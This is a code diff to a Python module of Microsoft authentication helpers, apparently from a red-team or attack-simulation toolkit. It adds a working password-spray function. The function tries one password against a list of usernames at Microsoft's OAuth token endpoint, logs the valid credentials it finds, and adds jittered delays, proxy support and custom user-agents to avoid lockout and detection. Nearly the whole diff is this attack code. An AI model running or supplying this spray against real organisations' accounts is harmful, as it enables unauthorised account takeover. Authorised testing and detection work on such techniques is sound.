@@ -1,6 +1,7 @@
 import requests
 import time
 import logging
+import random
 
 def get_ms_token_client(tenant_id, client_id, client_secret, scope):
 
@@ -164,3 +165,67 @@ def get_ms_token(auth_config, auth_method, scope):
         return get_ms_token_device_code(auth_config['tenant_id'], scope)
     elif auth_method == 'client_credentials':
         return get_ms_token_client(auth_config['tenant_id'], auth_config['application_id'], auth_config['client_secret'], scope)
+    
+    
+
+def password_spray(params, sleep=None, jitter=None, user_agent=None, proxy=None):
+    
+    logging.info("Running the password_spray technique")
+    
+    user_list = params['user_list']
+    password = params['password']
+    sleep = params['sleep']
+    jitter  = params['jitter']
+
+    # URL for Microsoft login
+    url = "https://login.microsoft.com/common/oauth2/token"
+    client_id = "1b730954-1685-4b74-9bfd-dac224a7b894"
+
+    # Set up proxies if provided
+    proxies = {
+        "http": proxy,
+        "https": proxy
+    } if proxy else None
+
+    # Iterate over each user in the list
+    for user in user_list:
+        body_params = {
+            'resource': 'https://graph.windows.net',
+            'client_id': client_id,
+            'client_info': '1',
+            'grant_type': 'password',
+            'username': user,
+            'password': password,
+            'scope': 'openid'
+        }
+        
+        post_headers = {
+            'Accept': 'application/json',
+            'Content-Type': 'application/x-www-form-urlencoded'
+        }
+
+        # Add custom user-agent if provided
+        if user_agent:
+            post_headers['User-Agent'] = user_agent
+
+        # Submit the POST request
+        response = requests.post(url, headers=post_headers, data=body_params, proxies=proxies)
+        
+        if response.status_code == 200:
+            logging.info(f"Password Valid found for {user} : {password}")
+        else:
+            #print(response.json())
+            error_description = response.json().get('error_description', '')
+            error_code = response.json().get('error_codes', '')
+            #error_codes = (' '.join(error_code))
+            #print(error_description)
+            logging.info(f"Failed authentication attempt user {user} with error {error_code}")
+
+        # Apply fixed sleep time or variable sleep time with jitter
+        if sleep is not None:
+            if jitter is not None:
+                time.sleep(sleep + random.uniform(0, jitter))
+            else:
+                time.sleep(sleep)
+
+    logging.info("Password spray attack completed")
